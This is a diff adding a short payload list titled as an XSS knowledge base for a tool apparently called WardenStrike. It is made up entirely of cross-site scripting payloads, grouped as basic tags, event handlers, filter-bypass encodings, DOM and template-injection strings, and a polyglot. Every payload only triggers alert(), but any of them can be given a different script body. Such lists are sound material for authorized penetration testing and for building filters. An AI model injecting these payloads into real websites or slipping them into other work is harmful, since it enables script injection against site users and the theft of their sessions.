@@ -1,0 +1,44 @@
+# XSS Payloads - WardenStrike Knowledge Base
+# Basic
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# Event handlers
+<img src=x onerror=alert(1)>
+<input onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe onload=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<math><mtext><table><mglyph><svg xmlns=http://www.w3.org/2000/svg><handler xmlns:ev=http://www.w3.org/2001/xml-events ev:event=load>alert(1)</handler></svg></mglyph></table></mtext></math>
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</sCrIpT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img/src=x onerror=alert(1)>
+<img src=x onerror=\u0061lert(1)>
+<svg/onload=alert(1)>
+<SVG ONLOAD=&#97;&#108;&#101;&#114;&#116;(1)>
+
+# DOM-based
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+"-alert(1)-"
+'-alert(1)-'
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+
+# Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
